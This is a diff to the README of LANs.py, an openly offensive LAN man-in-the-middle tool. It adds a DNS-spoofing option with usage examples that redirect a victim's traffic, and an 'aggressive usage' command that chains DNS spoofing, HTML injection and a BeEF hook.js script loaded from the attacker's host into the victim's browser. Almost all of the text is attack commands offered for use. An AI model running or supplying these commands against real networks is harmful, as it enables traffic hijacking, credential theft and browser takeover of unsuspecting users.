@@ -14,7 +14,7 @@ Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking 
 All options:
 
 ``` shell
-python LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC] [-d]
+python LANs.py [-a] [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC] [-d]
   [-v] [-dns DNSSPOOF] [-r IPADDRESS] [-set] [-p] [-na] [-n] [-i INTERFACE] 
   [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]
 ```
@@ -72,11 +72,24 @@ python LANs.py -pcap libpcapfilename -ip 192.168.0.10
 To read from a pcap file you must include the target's IP address with the -ip option. It must also be in libpcap form which is the most common anyway. One advantage of reading from a pcap file is that you do not need to be root to execute the script.
 
 
+### DNS spoofing
+``` shell
+python LANs.py -a -r 80.87.128.67
+```
+``` shell
+python LANs.py -dns eff.org
+```
+
+Example 1: The -a option will spoof every single DNS request the victim makes and when used in conjuction with -r it will redirect them to -r's argument address. The victim will be redirected to stallman.org (80.87.128.67) no matter what they type in the address bar.
+
+Example 2: This will spoof the domain eff.org and subdomains of eff.org. When there is no -r argument present with the -a or -dns arguments the script will default to sending the victim to the attacker's IP address. If the victim tries to go to eff.org they will be redirected to the attacker's IP.
+
 ### Most aggressive usage:
 
 ``` shell
-python LANs.py -v -d -p -n -na -set -dns facebook.com -r 74.125.225.64 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
+python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
 ```
+
 
 ### All options:
 
@@ -91,6 +104,8 @@ python LANs.py -h
 -d: open an xterm with driftnet to see all images they view
 
 -dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
+
+-a: Spoof every DNS response the victim makes, effectively creating a captive portal page; -r option can be used with this
 
 -r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN
 
